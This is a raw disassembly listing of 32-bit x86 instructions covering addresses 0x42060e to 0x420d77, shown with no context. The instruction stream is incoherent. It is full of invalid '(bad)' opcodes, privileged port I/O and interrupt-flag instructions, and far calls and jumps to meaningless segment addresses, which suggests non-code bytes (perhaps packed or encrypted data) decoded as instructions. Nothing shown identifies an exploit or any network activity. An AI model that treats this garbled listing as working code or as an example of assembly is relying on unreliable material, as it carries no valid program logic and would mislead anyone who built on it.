  42060e:	(bad)  
  42060f:	xor    al,0x92
  420611:	sub    dl,bh
  420613:	or     BYTE PTR [eax],bl
  420615:	int3   
  420616:	sti    
  420617:	cmp    esi,DWORD PTR [edi+0x3282f948]
  42061d:	sti    
  42061e:	sbb    al,0x58
  420620:	push   es
  420621:	sub    BYTE PTR ds:0x6ca6d674,0x30
  420628:	ret    0xf69e
  42062b:	mov    edx,0x1343bffa
  420630:	idiv   BYTE PTR [ebx+esi*8-0x44d63911]
  420637:	out    0xf1,eax
  420639:	inc    ebp
  42063a:	call   0x426eb24
  42063f:	cmp    cl,BYTE PTR [edx]
  420641:	xchg   esp,eax
  420642:	cwde   
  420643:	jp     0x42067c
  420645:	jmp    0x12a5771e
  42064a:	adc    BYTE PTR [eax-0x13],bh
  42064d:	pop    ss
  42064e:	jae    0x4206ce
  420650:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420651:	retf   0xb2ff
  420654:	pushf  
  420655:	cmp    eax,0xb186e82e
  42065a:	inc    edx
  42065b:	mov    ebp,0x49cdf18
  420660:	in     al,0xb7
  420662:	shl    BYTE PTR [ebp-0x34],cl
  420665:	nop
  420666:	push   0xf7c89715
  42066b:	cli    
  42066c:	rcr    DWORD PTR [esp+edx*8],1
  42066f:	adc    ah,ah
  420671:	int3   
  420672:	mov    eax,ds:0x8674ff8
  420677:	loop   0x4206bb
  420679:	test   DWORD PTR [esi+0x4660fc8e],esp
  42067f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420680:	inc    ecx
  420681:	inc    esi
  420682:	loopne 0x4206ff
  420684:	adc    eax,esi
  420686:	addr16 (bad) 
  420688:	cmp    al,0x4e
  42068a:	cmp    al,0x94
  42068c:	adc    ch,BYTE PTR [ecx-0x13706bac]
  420692:	jo     0x420618
  420694:	or     edx,DWORD PTR [edx+0x1fbe6ed1]
  42069a:	add    BYTE PTR [eax],al
  42069c:	push   ebx
  42069d:	(bad)  
  42069e:	(bad)  
  42069f:	push   esi
  4206a0:	(bad)  
  4206a1:	jle    0x42069e
  4206a3:	xlat   BYTE PTR ds:[ebx]
  4206a4:	outs   dx,DWORD PTR ds:[esi]
  4206a5:	mov    ah,0x77
  4206a7:	call   0x82c6:0x16156882
  4206ae:	add    DWORD PTR [eax],eax
  4206b0:	xchg   BYTE PTR [edx],al
  4206b2:	add    BYTE PTR [eax],al
  4206b4:	hlt    
  4206b5:	or     BYTE PTR [esi],dh
  4206b7:	sbb    edi,DWORD PTR [edi]
  4206b9:	shl    DWORD PTR [eax+0x6d97285b],0x47
  4206c0:	jp     0x4206f3
  4206c2:	xchg   esi,eax
  4206c3:	mov    al,0x49
  4206c5:	adc    BYTE PTR [edi+0x13],dl
  4206c8:	xchg   esi,eax
  4206c9:	int    0x2d
  4206cb:	retf   0x7b77
  4206ce:	adc    esp,ebp
  4206d0:	cmp    edx,esp
  4206d2:	cdq    
  4206d3:	scas   eax,DWORD PTR es:[edi]
  4206d4:	bound  ecx,QWORD PTR [ecx+0x12332e0f]
  4206da:	inc    ecx
  4206db:	gs cs popf 
  4206de:	sbb    al,0x7b
  4206e0:	dec    esp
  4206e1:	sub    DWORD PTR fs:[ebp+0x529ee925],ebx
  4206e8:	fsub   DWORD PTR [esi+0x5f]
  4206eb:	jecxz  0x420743
  4206ed:	mov    al,0x9e
  4206ef:	mov    bl,0x39
  4206f1:	clc    
  4206f2:	lods   al,BYTE PTR ds:[esi]
  4206f3:	out    0xa2,eax
  4206f5:	add    eax,0xf575b75
  4206fa:	mov    ebp,0xe7a3bf65
  4206ff:	pop    edi
  420700:	mov    ebx,0x99d1da79
  420705:	push   eax
  420706:	int    0xbb
  420708:	loop   0x4206c7
  42070a:	stos   DWORD PTR es:[edi],eax
  42070b:	pop    esi
  42070c:	popf   
  42070d:	(bad)  
  42070e:	jmp    0x990:0x78712167
  420715:	ret    
  420716:	fisubr WORD PTR [esi]
  420718:	jae    0x420790
  42071a:	adc    DWORD PTR [ecx],esp
  42071c:	xor    eax,edi
  42071e:	push   esp
  42071f:	xor    BYTE PTR [edx+0x4f],0x59
  420723:	xor    DWORD PTR [ebx+0x7a],ebp
  420726:	mov    bh,0xe5
  420728:	xchg   ebp,eax
  420729:	cwde   
  42072a:	mov    ebp,0xe31edb6e
  42072f:	es and edx,eax
  420732:	ds pop esi
  420734:	(bad)  
  420736:	sbb    eax,0x2b214a6d
  42073b:	dec    ecx
  42073c:	push   0x171bbbd3
  420741:	inc    esp
  420742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420743:	jl     0x42079f
  420745:	and    dh,BYTE PTR [ecx]
  420747:	jmp    0x42076a
  420749:	jne    0x420727
  42074b:	jg     0x4206d0
  42074d:	mov    al,0x44
  42074f:	cmp    cl,BYTE PTR ds:0x2ae820ba
  420755:	ret    
  420756:	hlt    
  420757:	inc    ebx
  420758:	call   0xe937:0x52aaa517
  42075f:	ret    0xb657
  420762:	cmc    
  420763:	outs   dx,BYTE PTR ds:[esi]
  420764:	or     al,0x9b
  420766:	pop    ebx
  420767:	push   es
  420768:	jecxz  0x4207e4
  42076a:	test   al,0xcf
  42076c:	aaa    
  42076d:	mov    dl,0x0
  42076f:	dec    esi
  420770:	stos   DWORD PTR es:[edi],eax
  420771:	dec    edx
  420772:	jp     0x420755
  420774:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420775:	jno    0x420757
  420777:	mov    ebx,0xeb8514d5
  42077c:	pop    ds
  42077d:	adc    eax,0x550a5435
  420782:	call   0xcb8aa630
  420787:	or     bh,BYTE PTR [edi+0x3def1310]
  42078d:	sub    BYTE PTR [edx-0x607a1e8b],dh
  420793:	outs   dx,BYTE PTR ds:[esi]
  420794:	xor    edi,edi
  420796:	push   0x46
  420798:	add    DWORD PTR [edi-0x5c42401c],ecx
  42079e:	inc    ebp
  42079f:	mov    esi,0x52757939
  4207a4:	pop    ebx
  4207a5:	pop    esp
  4207a6:	fisubr WORD PTR [edi-0x45eed62b]
  4207ac:	xchg   edi,eax
  4207ad:	adc    eax,0x9621f6b1
  4207b2:	xor    DWORD PTR [eax-0x10bcecd9],esi
  4207b8:	sbb    al,0xb5
  4207ba:	add    BYTE PTR [ecx],cl
  4207bc:	test   BYTE PTR [ecx],bl
  4207be:	dec    ebp
  4207bf:	lods   al,BYTE PTR ds:[esi]
  4207c0:	test   DWORD PTR [ecx],ecx
  4207c2:	popa   
  4207c3:	sti    
  4207c4:	xchg   DWORD PTR [edi],ebx
  4207c6:	fst    DWORD PTR [ecx-0x3b56357d]
  4207cc:	aam    0x3e
  4207ce:	sbb    edi,DWORD PTR [edx]
  4207d0:	ja     0x42077d
  4207d2:	sti    
  4207d3:	xor    al,0x17
  4207d5:	inc    edx
  4207d6:	xor    al,0xa8
  4207d8:	cmp    al,0x77
  4207da:	and    al,0x7b
  4207dc:	(bad)  
  4207de:	dec    ebx
  4207df:	retf   0x2e8e
  4207e2:	jb     0x4207fe
  4207e4:	add    cl,BYTE PTR [ebp-0x3771676e]
  4207ea:	mov    BYTE PTR [esi],bl
  4207ec:	(bad)  [esp+ecx*4]
  4207ef:	add    BYTE PTR [edx],bl
  4207f1:	in     al,0xeb
  4207f3:	fwait
  4207f4:	mov    dh,0x16
  4207f6:	in     eax,dx
  4207f7:	sbb    DWORD PTR [edx-0x32],ebx
  4207fa:	xchg   ecx,eax
  4207fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207fc:	pushf  
  4207fd:	mov    al,0x93
  4207ff:	clc    
  420800:	xchg   edx,eax
  420801:	mov    al,0x9a
  420803:	sbb    DWORD PTR [ebp-0x66],0xb8ff52b
  42080a:	es pop ebx
  42080c:	jns    0x4207ba
  42080e:	call   0xf97339bb
  420813:	mov    dh,0x3c
  420815:	fwait
  420816:	add    bh,BYTE PTR [edx]
  420818:	push   ss
  420819:	enter  0x1f00,0xc5
  42081d:	jbe    0x42083b
  42081f:	cmp    ebp,DWORD PTR [eax-0x3a25730c]
  420825:	imul   ecx
  420827:	xor    al,0x2b
  420829:	push   0x57c8f4fa
  42082e:	div    DWORD PTR [ebx+0x3d007f6e]
  420834:	adc    al,0xe1
  420836:	pop    edi
  420837:	xchg   BYTE PTR ds:[eax-0x66],dl
  42083b:	pop    edx
  42083c:	xor    eax,0x3a6e9788
  420841:	and    dh,BYTE PTR [ebp+0x4530ad3a]
  420847:	xor    ah,BYTE PTR [eax-0x1760b76c]
  42084d:	sahf   
  42084e:	int    0x26
  420850:	scas   al,BYTE PTR es:[edi]
  420851:	shl    DWORD PTR [ecx+eax*4-0x33],cl
  420855:	sar    ebp,1
  420857:	add    bl,dh
  420859:	dec    edi
  42085a:	shl    BYTE PTR [eax],cl
  42085c:	dec    ecx
  42085d:	cdq    
  42085e:	cmp    bl,ah
  420860:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420861:	shr    BYTE PTR [edi],1
  420863:	pop    ebx
  420864:	pop    ds
  420865:	sub    DWORD PTR [ebp-0x3b4ef5e1],0xeaa43fe5
  42086f:	and    cl,BYTE PTR [ecx]
  420871:	pop    ecx
  420872:	pop    esi
  420873:	mov    dh,0x6e
  420875:	add    eax,0x232a7849
  42087a:	ret    0xbbea
  42087d:	lahf   
  42087e:	push   es
  42087f:	call   0x1cfadd4b
  420884:	jne    0x4208f8
  420886:	xchg   ebp,eax
  420887:	xor    eax,0x408cbb49
  42088c:	lods   al,BYTE PTR ds:[esi]
  42088d:	mov    ch,0x14
  42088f:	lods   al,BYTE PTR ds:[esi]
  420890:	jmp    0x64cb:0x523415e7
  420897:	(bad)  
  420898:	retf   
  420899:	xchg   esp,eax
  42089a:	stos   BYTE PTR es:[edi],al
  42089b:	add    DWORD PTR [ecx+0x74],eax
  42089e:	mov    WORD PTR [edi],gs
  4208a0:	pop    esi
  4208a1:	pop    ds
  4208a2:	mov    ebp,0x4b1f992f
  4208a7:	(bad)
  4208ab:	fadd   DWORD PTR [ebx]
  4208ad:	and    ecx,DWORD PTR [edi-0x36]
  4208b0:	xchg   ebx,eax
  4208b1:	dec    esi
  4208b2:	fsub   DWORD PTR [eax-0x70]
  4208b5:	fsqrt  
  4208b7:	mov    al,BYTE PTR [esi+0x458751b6]
  4208bd:	xchg   ebx,eax
  4208be:	push   eax
  4208bf:	sbb    BYTE PTR [ecx+0x74b5fa36],0x5b
  4208c6:	scas   eax,DWORD PTR es:[edi]
  4208c7:	int3   
  4208c8:	cmc    
  4208c9:	lahf   
  4208ca:	std    
  4208cb:	sahf   
  4208cc:	dec    edx
  4208cd:	push   ds
  4208ce:	mov    eax,ds:0xf690b8e7
  4208d3:	dec    ecx
  4208d4:	dec    ecx
  4208d5:	xor    eax,0x77fc53fe
  4208da:	into   
  4208db:	pop    ebx
  4208dc:	adc    bl,BYTE PTR [ecx-0x8536bb7]
  4208e2:	int3   
  4208e3:	adc    eax,0xb3809460
  4208e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208e9:	pushf  
  4208ea:	std    
  4208eb:	lock mov eax,ds:0xb796fa28
  4208f1:	mov    bh,0x2d
  4208f3:	sbb    al,0xef
  4208f5:	cmp    al,0xc8
  4208f7:	in     eax,dx
  4208f8:	jmp    0x4b19:0x60f1f188
  4208ff:	and    al,bh
  420901:	pop    esp
  420902:	retf   
  420903:	into   
  420904:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420905:	or     DWORD PTR [esi+edx*4+0x14309089],eax
  42090c:	pop    ecx
  42090d:	in     eax,dx
  42090e:	mov    BYTE PTR [esi],ah
  420910:	xchg   ebx,eax
  420911:	cdq    
  420912:	ret    0x605f
  420915:	mov    ecx,esp
  420917:	or     edx,edi
  420919:	mov    cl,ch
  42091b:	or     cl,ah
  42091d:	or     BYTE PTR [ebp-0x5f],0x5c
  420921:	pop    esi
  420922:	or     al,BYTE PTR [edx-0x1d]
  420925:	pop    es
  420926:	pop    esp
  420927:	out    0x5d,al
  420929:	adc    eax,0x2d9beff1
  42092e:	cli    
  42092f:	jo     0x4208f1
  420931:	mov    ebp,0x8b218388
  420936:	iret   
  420937:	mov    cl,0x72
  420939:	mov    eax,ds:0xe110000
  42093e:	or     dl,ch
  420940:	pop    ds
  420941:	out    dx,al
  420942:	repz jmp FWORD PTR [edi-0x5c30fbda]
  420949:	loop   0x4208fd
  42094b:	add    DWORD PTR [ebp+eax*4+0x1],ecx
  42094f:	add    BYTE PTR [esi+0x3e000002],al
  420955:	es stos BYTE PTR es:[edi],al
  420957:	ss in  al,0x67
  42095a:	mov    edi,DWORD PTR [ecx+0x64]
  42095d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42095e:	(bad)
  420961:	add    ah,al
  420963:	jb     0x420910
  420965:	sahf   
  420966:	mul    BYTE PTR [ecx+0x5b3999bc]
  42096c:	xchg   ebp,eax
  42096d:	test   BYTE PTR [edi-0x10],0xdb
  420971:	jge    0x42090e
  420973:	pusha  
  420974:	jb     0x420997
  420976:	push   esp
  420977:	ins    BYTE PTR es:[edi],dx
  420978:	push   0x1951f331
  42097d:	adc    BYTE PTR [eax],cl
  42097f:	push   ds
  420980:	sti    
  420981:	fist   WORD PTR [eax-0x848996f]
  420987:	(bad)  [ebx+0x5ae5cbb8]
  42098d:	out    dx,eax
  42098e:	push   ecx
  42098f:	push   ds
  420990:	call   0xbd94e99b
  420995:	adc    eax,0x988ebaab
  42099a:	mov    ch,0x4a
  42099c:	inc    ecx
  42099d:	(bad)  
  42099e:	cs (bad) 
  4209a0:	jecxz  0x420a06
  4209a2:	or     BYTE PTR [ebx],0xe3
  4209a5:	inc    edi
  4209a6:	push   esp
  4209a7:	mov    dl,BYTE PTR [ebp-0x25]
  4209aa:	popf   
  4209ab:	fimul  DWORD PTR [ebp+0x41010932]
  4209b1:	out    dx,al
  4209b2:	pop    esi
  4209b3:	push   ds
  4209b4:	ror    DWORD PTR [eax-0x43],0xde
  4209b8:	test   al,0xe5
  4209ba:	inc    edx
  4209bb:	outs   dx,BYTE PTR ds:[esi]
  4209bc:	or     ah,bh
  4209be:	jle    0x420993
  4209c0:	xor    DWORD PTR [edx-0x3a40cf29],edi
  4209c6:	ja     0x4209f1
  4209c8:	in     eax,0xbf
  4209ca:	xchg   esi,eax
  4209cb:	dec    esi
  4209cc:	jae    0x4209c6
  4209ce:	pop    ss
  4209cf:	mov    WORD PTR [ebp-0x69],es
  4209d2:	dec    ecx
  4209d3:	addr16 pop ss
  4209d5:	push   edi
  4209d6:	dec    ecx
  4209d7:	mov    esp,0x8c6c5a51
  4209dc:	test   al,ah
  4209de:	loopne 0x420a58
  4209e0:	and    eax,0x1183e4a3
  4209e5:	jne    0x4209b7
  4209e7:	inc    esi
  4209e8:	xor    eax,0xb1368299
  4209ed:	or     eax,0x27801a44
  4209f2:	xchg   ebx,eax
  4209f3:	(bad)  [edi-0x67]
  4209f6:	mov    al,0xf0
  4209f8:	push   eax
  4209f9:	stos   BYTE PTR es:[edi],al
  4209fa:	scas   al,BYTE PTR es:[edi]
  4209fb:	push   eax
  4209fc:	cli    
  4209fd:	lds    ecx,FWORD PTR [edx]
  4209ff:	test   BYTE PTR [eax+0x2f],0x24
  420a03:	and    BYTE PTR [esi+0x3c],ah
  420a06:	ss into 
  420a08:	jmp    0x4209e7
  420a0a:	sbb    eax,0x66470c6b
  420a0f:	mov    ebp,0x6ea09f7
  420a14:	jp     0x4209b7
  420a16:	adc    DWORD PTR [ecx+0x2a4106c7],ecx
  420a1c:	mov    al,0xed
  420a1e:	cvtps2pi mm7,xmm7
  420a21:	imul   esp,DWORD PTR [esi-0x19bea521],0x6f
  420a28:	ss int 0xc7
  420a2b:	xchg   esi,eax
  420a2c:	adc    dl,BYTE PTR [ebx+esi*8-0x15]
  420a30:	arpl   WORD PTR [ecx+0x1e],ax
  420a33:	popf   
  420a34:	(bad)  
  420a35:	pop    eax
  420a36:	or     dl,BYTE PTR [ebx+0x44c12263]
  420a3c:	mov    cl,0x23
  420a3e:	dec    edx
  420a3f:	out    0x51,eax
  420a41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a42:	sbb    ecx,esp
  420a44:	hlt    
  420a45:	in     eax,0x3b
  420a47:	dec    edx
  420a48:	cmp    ebp,DWORD PTR [esi+ebx*2-0x6d]
  420a4c:	cdq    
  420a4d:	pop    esi
  420a4e:	push   es
  420a4f:	inc    edx
  420a50:	addr16 sbb ebp,eax
  420a53:	pop    esp
  420a54:	nop
  420a55:	and    ch,BYTE PTR [ebx]
  420a57:	pop    ds
  420a58:	or     dh,ch
  420a5a:	jge    0x420a7f
  420a5c:	aaa    
  420a5d:	scas   eax,DWORD PTR es:[edi]
  420a5e:	xlat   BYTE PTR ds:[ebx]
  420a5f:	fbld   TBYTE PTR [esp+eax*4-0x75]
  420a63:	dec    esi
  420a64:	add    bl,BYTE PTR [ecx+0x4717b1a0]
  420a6a:	push   0x76
  420a6c:	xchg   BYTE PTR [edx+ecx*1-0x11],bl
  420a70:	mov    cl,ch
  420a72:	mov    ch,0x99
  420a74:	arpl   WORD PTR [ebx],sp
  420a76:	sbb    BYTE PTR [ebx-0x66a30ec8],ah
  420a7c:	std    
  420a7d:	or     BYTE PTR [ecx],al
  420a7f:	das    
  420a80:	or     ebp,ebp
  420a82:	jp     0x420a20
  420a84:	lea    edi,[esi+0x46]
  420a87:	cdq    
  420a88:	add    DWORD PTR ds:0xb6d063c2,0xe8827393
  420a92:	and    eax,0x70be1fd8
  420a97:	pop    eax
  420a98:	dec    eax
  420a99:	sub    eax,0x32549f4d
  420a9e:	inc    ecx
  420a9f:	xchg   DWORD PTR [ebp+0x76],ecx
  420aa2:	adc    al,0x9d
  420aa4:	adc    cl,cl
  420aa6:	iret   
  420aa7:	outs   dx,BYTE PTR ds:[esi]
  420aa8:	xlat   BYTE PTR ds:[ebx]
  420aa9:	cmp    al,0xbd
  420aab:	mov    ds:0x15be7be7,al
  420ab0:	cdq    
  420ab1:	out    dx,eax
  420ab2:	jne    0x420ae2
  420ab4:	test   al,0xd1
  420ab6:	rol    DWORD PTR [ecx-0x53],1
  420ab9:	add    eax,0x174a3ee5
  420abe:	or     edx,DWORD PTR [esi+0x42]
  420ac1:	(bad)  
  420ac2:	addr16 push cs
  420ac4:	test   al,dl
  420ac6:	sbb    DWORD PTR [edi-0x2c],eax
  420ac9:	push   0x27d4597a
  420ace:	xchg   ebp,eax
  420acf:	adc    DWORD PTR [edi],ebx
  420ad1:	mov    edx,DWORD PTR gs:[ecx+edi*8+0x1c]
  420ad6:	dec    ebx
  420ad7:	popf   
  420ad8:	push   esp
  420ad9:	add    BYTE PTR [ecx],bl
  420adb:	rcr    BYTE PTR [eax-0x1f292618],cl
  420ae1:	out    dx,eax
  420ae2:	in     eax,dx
  420ae3:	sub    DWORD PTR [edi+0x1e],ebx
  420ae6:	mov    eax,ds:0x38cbf0bf
  420aeb:	(bad)  
  420aec:	sbb    DWORD PTR [edi],eax
  420aee:	mov    ecx,0x27c515cf
  420af3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420af4:	inc    esp
  420af5:	ins    DWORD PTR es:[edi],dx
  420af6:	xchg   esp,eax
  420af7:	jbe    0x420a91
  420af9:	dec    edx
  420afa:	xchg   ebx,eax
  420afb:	add    edi,eax
  420afd:	adc    DWORD PTR [ecx],0x4d
  420b00:	retf   0x86b9
  420b03:	cwde   
  420b04:	mov    dl,0x1e
  420b06:	and    ch,BYTE PTR [ecx]
  420b08:	mov    bl,0x7e
  420b0a:	in     eax,0x2e
  420b0c:	mov    dh,BYTE PTR [eax+0x12]
  420b0f:	fcom   DWORD PTR [ecx-0x48514062]
  420b15:	cmp    al,0xfa
  420b17:	iret   
  420b18:	fist   DWORD PTR [edx-0x22]
  420b1b:	lock test ax,0x6e23
  420b20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b21:	jo     0x420b96
  420b23:	scas   eax,DWORD PTR es:[edi]
  420b24:	adc    al,0x40
  420b26:	out    dx,al
  420b27:	and    edi,esp
  420b29:	pop    ss
  420b2a:	ror    DWORD PTR [ebx+0x29],0x5d
  420b2e:	ds jo  0x420bab
  420b31:	xor    BYTE PTR [eax],al
  420b33:	mov    esp,0xd7be1bfd
  420b38:	ins    DWORD PTR es:[edi],dx
  420b39:	arpl   WORD PTR ds:0x4e46ace2,bx
  420b3f:	xor    ebx,DWORD PTR [ecx-0x720354c0]
  420b45:	mov    ecx,0x43a9f628
  420b4a:	sub    dl,BYTE PTR [eax-0x15d0e1d7]
  420b50:	jp     0x420b63
  420b52:	ss shl edx,1
  420b55:	pop    esp
  420b56:	jbe    0x420b41
  420b58:	fstp   QWORD PTR [ecx-0x13]
  420b5b:	jmp    0x420b5d
  420b5d:	sahf   
  420b5e:	push   es
  420b5f:	das    
  420b60:	in     al,0xc3
  420b62:	cmp    eax,0xc015f95a
  420b67:	xchg   esi,eax
  420b68:	rcl    BYTE PTR [ecx],1
  420b6a:	jno    0x420b1f
  420b6c:	sub    al,0xda
  420b6e:	out    0xfc,eax
  420b70:	aas    
  420b71:	je     0x420ba3
  420b73:	and    al,0xc0
  420b75:	sbb    ebx,DWORD PTR [esi+0x25]
  420b78:	inc    eax
  420b79:	into   
  420b7a:	dec    ecx
  420b7b:	sbb    DWORD PTR [edx],ebp
  420b7d:	stos   DWORD PTR es:[edi],eax
  420b7e:	jmp    0x6a80:0x5f5c95ec
  420b85:	xchg   ebp,ebx
  420b87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b88:	cmp    cl,BYTE PTR ds:0xc6e42f6e
  420b8e:	adc    eax,0x66219312
  420b93:	xor    DWORD PTR [ebx],0x15
  420b96:	push   0xffffffac
  420b98:	xchg   edx,eax
  420b99:	xchg   ebp,eax
  420b9a:	xor    edx,DWORD PTR [edi+0x12029501]
  420ba0:	adc    BYTE PTR [eax+0x23],dl
  420ba3:	in     eax,dx
  420ba4:	xor    BYTE PTR [esi],bh
  420ba6:	inc    esi
  420ba7:	cmp    DWORD PTR ss:[ebp+0x9031b3e],esi
  420bae:	cmp    al,0x45
  420bb0:	in     eax,dx
  420bb1:	jb     0x420b36
  420bb3:	inc    esi
  420bb4:	mov    WORD PTR [esi],cs
  420bb6:	pop    ecx
  420bb7:	ds clc 
  420bb9:	cmc    
  420bba:	jnp    0x420b8e
  420bbc:	jl     0x420b84
  420bbe:	pushf  
  420bbf:	hlt    
  420bc0:	aad    0xf5
  420bc2:	pop    esi
  420bc3:	jmp    0x420b61
  420bc5:	mov    ebx,0xd6aa5f51
  420bca:	push   esi
  420bcb:	mov    dh,BYTE PTR [edx-0x3f]
  420bce:	fisttp QWORD PTR [edi]
  420bd0:	aaa    
  420bd1:	daa    
  420bd2:	sbb    dh,BYTE PTR [edx+0x1a]
  420bd5:	inc    ebx
  420bd6:	push   esp
  420bd7:	sbb    al,0xf6
  420bd9:	cdq    
  420bda:	add    BYTE PTR [eax],al
  420bdc:	leave  
  420bdd:	xchg   esi,eax
  420bde:	ins    DWORD PTR es:[edi],dx
  420bdf:	mov    dh,0x7f
  420be1:	(bad)  
  420be2:	(bad)  
  420be4:	aam    0xd9
  420be6:	inc    ebx
  420be7:	fdiv   st,st(5)
  420be9:	and    al,0x73
  420beb:	inc    esi
  420bec:	rol    BYTE PTR [edi+0x2860001],cl
  420bf2:	add    BYTE PTR [eax],al
  420bf4:	cmp    eax,0x5aef84d9
  420bf9:	pusha  
  420bfa:	mov    eax,0x348af68c
  420bff:	xchg   esp,eax
  420c00:	inc    edx
  420c01:	xor    BYTE PTR [ebp-0x6],0xce
  420c05:	call   0xb6fa:0xbddea455
  420c0c:	sub    al,0x6b
  420c0e:	adc    BYTE PTR [eax+0x2d],dh
  420c11:	mov    edx,0x805fb7ff
  420c16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c17:	sub    DWORD PTR [ebx],edx
  420c19:	pushw  cs
  420c1b:	int3   
  420c1c:	loop   0x420be2
  420c1e:	fnstenv [edx+0x3e]
  420c21:	add    DWORD PTR [ecx],ecx
  420c23:	push   esp
  420c24:	cmp    ebx,DWORD PTR [edi+0x31e5ab0e]
  420c2a:	mov    ah,0x9e
  420c2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c2d:	or     dh,BYTE PTR [ebx]
  420c2f:	jns    0x420c7e
  420c31:	mov    eax,ds:0x54b85940
  420c36:	cmp    edx,DWORD PTR [edi]
  420c38:	sahf   
  420c39:	xlat   BYTE PTR ds:[ebx]
  420c3a:	mov    ah,0x8b
  420c3c:	aam    0xab
  420c3e:	xor    eax,0x32328fd3
  420c43:	dec    ebx
  420c44:	mov    WORD PTR [edx],cs
  420c46:	and    dh,BYTE PTR [ecx]
  420c48:	loopne 0x420c42
  420c4a:	mov    cl,ah
  420c4c:	lods   eax,DWORD PTR ds:[esi]
  420c4d:	jp     0x420c9c
  420c4f:	sti    
  420c50:	stc    
  420c51:	imul   esp,DWORD PTR [esi],0xc6780813
  420c57:	add    cl,BYTE PTR [edi-0x2ad0c703]
  420c5d:	push   esi
  420c5e:	clc    
  420c5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c60:	push   eax
  420c61:	sub    al,0x1d
  420c63:	call   0xede7:0x76da94f3
  420c6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c6b:	inc    esp
  420c6c:	stos   DWORD PTR es:[edi],eax
  420c6d:	cmp    DWORD PTR [ecx+0x45],edi
  420c70:	test   al,0x1b
  420c72:	mov    esi,0x4c5bf1bb
  420c77:	(bad)  
  420c78:	push   0xa0b4f7d0
  420c7d:	sbb    al,0x47
  420c7f:	sbb    DWORD PTR [edx-0x16],ebx
  420c82:	jno    0x420c44
  420c84:	es clc 
  420c86:	jb     0x420c47
  420c88:	ror    esi,cl
  420c8a:	or     ah,BYTE PTR [ebx+0x76]
  420c8d:	sbb    ebx,DWORD PTR [ecx-0x1b]
  420c90:	lahf   
  420c91:	scas   ax,WORD PTR es:[edi]
  420c93:	cmp    al,0xd5
  420c95:	and    edx,DWORD PTR [edi+0x1165062b]
  420c9b:	push   ds
  420c9c:	pop    edi
  420c9d:	xchg   ebp,eax
  420c9e:	(bad)  
  420c9f:	aad    0xa5
  420ca1:	jle    0x420d12
  420ca3:	call   0xa783:0xe7e0f37b
  420caa:	shl    esp,cl
  420cac:	mov    esp,0x2660cdf9
  420cb1:	xchg   ebp,eax
  420cb2:	addr16 jge 0x420c3f
  420cb5:	shl    ecx,0x8a
  420cb8:	addr16 sti 
  420cba:	daa    
  420cbb:	fld    TBYTE PTR [edx+0x7c]
  420cbe:	ss retf 0xa678
  420cc2:	loope  0x420d43
  420cc4:	(bad)  
  420cc5:	addr16 jae 0x420cfc
  420cc8:	mov    esi,0x477a3eb3
  420ccd:	lea    ebp,[ebx]
  420ccf:	mov    BYTE PTR [eax+eax*4],dl
  420cd2:	scas   al,BYTE PTR es:[edi]
  420cd3:	sbb    DWORD PTR [edi+0x5c],edx
  420cd6:	add    eax,0x2035d0ae
  420cdb:	ins    BYTE PTR es:[edi],dx
  420cdc:	cmp    ch,bh
  420cde:	jns    0x420cc6
  420ce0:	ins    DWORD PTR es:[edi],dx
  420ce1:	addr16 xchg esi,eax
  420ce3:	pop    edx
  420ce4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ce5:	sub    ebx,edi
  420ce7:	stos   BYTE PTR es:[edi],al
  420ce8:	sub    edx,DWORD PTR [edx-0x3c]
  420ceb:	pusha  
  420cec:	(bad)  
  420ced:	push   ss
  420cee:	push   cs
  420cef:	aas    
  420cf0:	cli    
  420cf1:	(bad)  
  420cf2:	add    al,0x7c
  420cf4:	sub    al,cl
  420cf6:	mov    edx,0x90ac46e0
  420cfb:	lods   al,BYTE PTR ds:[esi]
  420cfc:	sahf   
  420cfd:	imul   eax,DWORD PTR [ebx+0x3913fa1d],0x36
  420d04:	xchg   esp,eax
  420d05:	outs   dx,BYTE PTR ds:[esi]
  420d06:	mov    eax,0x5e52106e
  420d0b:	push   ebx
  420d0c:	out    0xf6,eax
  420d0e:	pop    eax
  420d0f:	sub    edx,ebp
  420d11:	pop    edi
  420d12:	push   es
  420d13:	push   0x40
  420d15:	test   BYTE PTR [ecx-0x6a],cl
  420d18:	in     al,0x28
  420d1a:	push   ds
  420d1b:	jbe    0x8cad4a89
  420d21:	add    eax,0x4492e212
  420d26:	lea    eax,[ecx+0x3962e8ab]
  420d2c:	cmp    BYTE PTR [ecx-0x32],bl
  420d2f:	hlt    
  420d30:	adc    eax,DWORD PTR [edi+0x7fba01ab]
  420d36:	sub    al,0xb1
  420d38:	dec    ebp
  420d39:	sub    DWORD PTR [eax+0x7cfe1ceb],esi
  420d3f:	pop    ecx
  420d40:	arpl   WORD PTR [eax-0x4f],cx
  420d43:	stos   BYTE PTR es:[edi],al
  420d44:	retf   0x888b
  420d47:	sbb    eax,0x877f914d
  420d4c:	add    al,0xef
  420d4e:	and    al,BYTE PTR cs:[edx]
  420d51:	mov    ds:0xc49b5799,eax
  420d56:	cmp    edx,esi
  420d58:	inc    ecx
  420d59:	and    DWORD PTR [edx+eiz*4],edx
  420d5c:	sub    bh,bh
  420d5e:	cli    
  420d5f:	(bad)
  420d62:	sub    BYTE PTR [eax-0x1c1637c3],cl
  420d68:	iret   
  420d69:	jae    0x420cf6
  420d6b:	sub    eax,0xcc2dcd87
  420d70:	dec    ecx
  420d71:	cwde   
  420d72:	ins    BYTE PTR es:[edi],dx
  420d73:	xchg   esp,ebp
  420d75:	outs   dx,BYTE PTR ds:[esi]
  420d76:	push   edi
  420d77:	mov    bh,0x90
